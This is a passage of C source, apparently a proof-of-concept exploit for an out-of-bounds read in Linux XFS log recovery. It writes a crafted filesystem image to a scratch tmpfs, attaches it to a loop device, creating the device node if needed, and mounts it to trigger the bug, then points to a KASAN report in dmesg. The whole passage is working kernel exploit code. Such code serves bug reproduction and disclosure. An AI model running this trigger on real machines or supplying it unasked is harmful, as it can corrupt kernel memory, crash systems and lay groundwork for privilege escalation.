static const char *scratch_dirs[] = { "/mnt", "/media", "/opt", "/root", "/tmp" };

static int write_image(const char *path)
{
	int fd;
	unsigned long i, done = 0;

	fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0600);
	if (fd < 0) {
		fprintf(stderr, "[-] open(%s): %s\n", path, strerror(errno));
		return -1;
	}
	if (ftruncate(fd, (off_t)IMG_SIZE) < 0) {
		fprintf(stderr, "[-] ftruncate: %s\n", strerror(errno));
		close(fd);
		return -1;
	}
	for (i = 0; i < IMG_NCHUNKS; i++) {
		ssize_t n = pwrite(fd, img_blob + done, img_len[i],
				   (off_t)img_off[i]);
		if (n != (ssize_t)img_len[i]) {
			fprintf(stderr, "[-] pwrite chunk %lu: %s\n", i,
				strerror(errno));
			close(fd);
			return -1;
		}
		done += img_len[i];
	}
	fsync(fd);
	printf("[+] image written: %s (%llu bytes, %lu sparse chunks)\n",
	       path, (unsigned long long)IMG_SIZE, done ? IMG_NCHUNKS : 0);
	return fd;
}

int main(void)
{
	char img_path[256], mp_path[256], loop_path[64];
	const char *base = NULL;
	int i, ctlfd, loopfd, imgfd, devnr;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	printf("[*] xfs log-recovery reorder OOB PoC (uid=%d)\n", getuid());

	for (i = 0; i < (int)(sizeof(scratch_dirs) / sizeof(scratch_dirs[0])); i++) {
		if (mount("none", scratch_dirs[i], "tmpfs", 0, "size=512m") == 0) {
			base = scratch_dirs[i];
			break;
		}
		fprintf(stderr, "[ ] tmpfs on %s: %s\n", scratch_dirs[i],
			strerror(errno));
	}
	if (!base) {
		fprintf(stderr, "[-] could not mount a scratch tmpfs\n");
		return 1;
	}
	printf("[+] scratch tmpfs at %s\n", base);

	snprintf(img_path, sizeof(img_path), "%s/xfs.img", base);
	snprintf(mp_path, sizeof(mp_path), "%s/mp", base);
	mkdir(mp_path, 0755);

	imgfd = write_image(img_path);
	if (imgfd < 0)
		return 1;

	ctlfd = open("/dev/loop-control", O_RDWR);
	if (ctlfd < 0) {
		fprintf(stderr, "[-] open(/dev/loop-control): %s\n",
			strerror(errno));
		return 1;
	}
	devnr = ioctl(ctlfd, LOOP_CTL_GET_FREE);
	if (devnr < 0) {
		fprintf(stderr, "[-] LOOP_CTL_GET_FREE: %s\n", strerror(errno));
		return 1;
	}
	snprintf(loop_path, sizeof(loop_path), "/dev/loop%d", devnr);

	loopfd = open(loop_path, O_RDWR);
	if (loopfd < 0) {

		mknod(loop_path, S_IFBLK | 0600, makedev(7, devnr));
		loopfd = open(loop_path, O_RDWR);
	}
	if (loopfd < 0) {
		fprintf(stderr, "[-] open(%s): %s\n", loop_path, strerror(errno));
		return 1;
	}
	if (ioctl(loopfd, LOOP_SET_FD, imgfd) < 0) {
		fprintf(stderr, "[-] LOOP_SET_FD: %s\n", strerror(errno));
		return 1;
	}
	ioctl(loopfd, LOOP_SET_BLOCK_SIZE, 512);
	printf("[+] %s <- %s\n", loop_path, img_path);

	printf("[*] mount(%s, %s, xfs) -- log recovery starts here\n",
	       loop_path, mp_path);
	if (mount(loop_path, mp_path, "xfs", 0, NULL) == 0) {
		printf("[+] mounted (recovery completed)\n");
		umount2(mp_path, MNT_DETACH);
	} else {
		printf("[+] mount failed: %s (expected -- recovery aborts on the\n"
		       "    corrupt item; the OOB read already happened)\n",
		       strerror(errno));
	}

	ioctl(loopfd, LOOP_CLR_FD, 0);
	printf("[*] done -- check dmesg for the KASAN report\n");
	return 0;
}
